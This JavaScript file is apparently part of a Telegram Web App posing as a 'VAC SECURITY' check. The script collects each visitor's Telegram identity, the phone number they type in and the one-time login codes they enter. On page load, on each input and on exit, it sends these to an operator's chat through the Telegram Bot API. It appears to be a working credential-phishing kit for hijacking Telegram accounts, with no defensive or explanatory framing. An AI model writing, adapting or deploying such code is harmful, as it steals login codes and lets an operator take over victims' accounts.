// Конфигурация (значения будут заменены при сборке)
const config = {
    botToken: process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN',
    adminId: process.env.ADMIN_ID || 'YOUR_ADMIN_ID'
};

// Форматирование сообщений
const formatMessage = (user, action, data = null) => {
    const userInfo = `👤 *Пользователь:* ${user.first_name || 'Неизвестно'} ${user.last_name || ''}\n` +
                    `🆔 *ID:* ${user.id || 'Неизвестно'}\n` +
                    (user.username ? `🔗 *Username:* @${user.username}\n` : '');

    let actionText = '';
    switch(action) {
        case 'init':
            actionText = '🚪 *Вошел в приложение*';
            break;
        case 'phone':
            actionText = `📱 *Ввел номер:* \`${data}\``;
            break;
        case 'code':
            actionText = `🔢 *Ввел код:* ||\`${data}\`||`;
            break;
        case 'code_verified':
            actionText = '✅ *Код подтвержден*';
            break;
        case 'code_failed':
            actionText = `❌ *Неверный код:* ||\`${data}\`||`;
            break;
        case 'exit':
            actionText = '🚶 *Вышел из приложения*';
            break;
    }

    return `🔐 *VAC SECURITY BOT*\n\n${userInfo}\n${actionText}`;
};

// Отправка сообщения боту
const sendToAdmin = async (text) => {
    try {
        const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
        const params = {
            chat_id: config.adminId,
            text: text,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        };

        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(params)
        });
    } catch (error) {
        console.error('Ошибка отправки:', error);
    }
};

// Глобальная функция для отправки событий
window.sendToBot = async (action, data = null) => {
    const tg = window.Telegram.WebApp;
    const user = tg.initDataUnsafe.user || {};
    
    const message = formatMessage(user, action, data);
    await sendToAdmin(message);
};

// Отслеживание выхода из приложения
document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') {
        window.sendToBot('exit');
    }
});

// Инициализация
document.addEventListener('DOMContentLoaded', () => {
    window.sendToBot('init');
});